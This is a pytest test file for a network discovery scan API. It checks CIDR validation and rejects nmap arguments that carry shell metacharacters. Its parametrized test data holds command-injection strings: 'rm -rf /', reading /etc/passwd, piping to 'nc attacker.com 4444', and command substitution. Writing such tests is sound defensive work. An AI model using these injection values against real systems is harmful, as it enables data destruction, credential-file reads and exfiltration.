"""
Tests for the discovery scan API: POST /api/v1/discovery/scan and GET /api/v1/discovery/jobs
"""

import pytest

SCAN_URL = "/api/v1/discovery/scan"
JOBS_URL = "/api/v1/discovery/jobs"


# ---------------------------------------------------------------------------
# Create scan job
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_scan_valid_cidr(client, auth_headers):
    """Valid CIDR → 200/201/202 with a status field in the response."""
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}
    # Response may be a single job or a list — normalise for assertion
    body = resp.json()
    if isinstance(body, list):
        assert len(body) >= 1
        assert "status" in body[0]
    else:
        assert "status" in body


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_cidr",
    [
        "not-a-cidr",
        "192.168.1.300/24",
        "",
    ],
)
async def test_create_scan_invalid_cidr_returns_422(client, auth_headers, bad_cidr):
    """Malformed CIDR values should be rejected with 422."""
    payload = {"cidr": bad_cidr, "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_args",
    [
        "-sV; rm -rf /",
        "-sV && cat /etc/passwd",
        "-sV | nc attacker.com 4444",
        "-sV `id`",
        "-sV $(whoami)",
    ],
)
async def test_nmap_shell_metacharacter_rejected(client, auth_headers, bad_args):
    """nmap_arguments containing shell metacharacters should be rejected with 422."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": bad_args,
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_valid_nmap_arguments_accepted(client, auth_headers):
    """Safe nmap arguments like '-sV -T4' should be accepted."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": "-sV -T4",
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}


# ---------------------------------------------------------------------------
# List scan jobs
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_list_scan_jobs(client, auth_headers):
    """GET /discovery/jobs → 200 and returns a list."""
    resp = await client.get(JOBS_URL, headers=auth_headers)
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)
